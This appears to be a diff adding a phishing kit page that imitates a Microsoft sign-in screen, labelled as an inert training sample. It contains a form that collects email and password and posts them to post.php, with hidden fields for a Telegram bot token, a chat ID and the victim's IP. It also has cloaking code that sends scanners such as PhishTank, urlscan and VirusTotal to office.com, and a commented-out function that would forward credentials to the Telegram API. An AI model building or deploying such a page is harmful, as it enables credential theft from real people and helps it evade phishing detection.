@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>Sign in to your account</title>
+<link rel="icon" href="https://aadcdn.msftauth.net/favicon.ico">
+<script>var _0xk = "TRAINING KIT SAMPLE - INERT";</script></head>
+<body onload="document.getElementById('i0116').focus();">
+<form id="credentials" method="post" action="post.php" autocomplete="off">
+  <img src="ms_logo.svg" alt="Microsoft">
+  <input type="email"    id="i0116" name="login"  placeholder="Email, phone, or Skype">
+  <input type="password" id="i0118" name="passwd" placeholder="Password">
+  <input type="hidden"   name="bot_token" value="TRAINING-PLACEHOLDER">
+  <input type="hidden"   name="chat_id"   value="TRAINING-PLACEHOLDER">
+  <input type="hidden"   name="victim_ip" value="">
+  <button type="submit">Sign in</button>
+</form>
+<script>
+// anti-analysis: bail out on known crawler and sandbox ranges
+var blocked = ["googlebot","bingbot","phishtank","urlscan","virustotal","netcraft"];
+for (var i=0;i<blocked.length;i++){
+  if (navigator.userAgent.toLowerCase().indexOf(blocked[i])>-1){ window.location="https://www.office.com/"; }
+}
+// exfil helper (disabled in the training copy)
+function sendTelegram(u,p){ /* fetch('https://api.telegram.org/bot'+bot_token+'/sendMessage') */ }
+</script>
+</body></html>
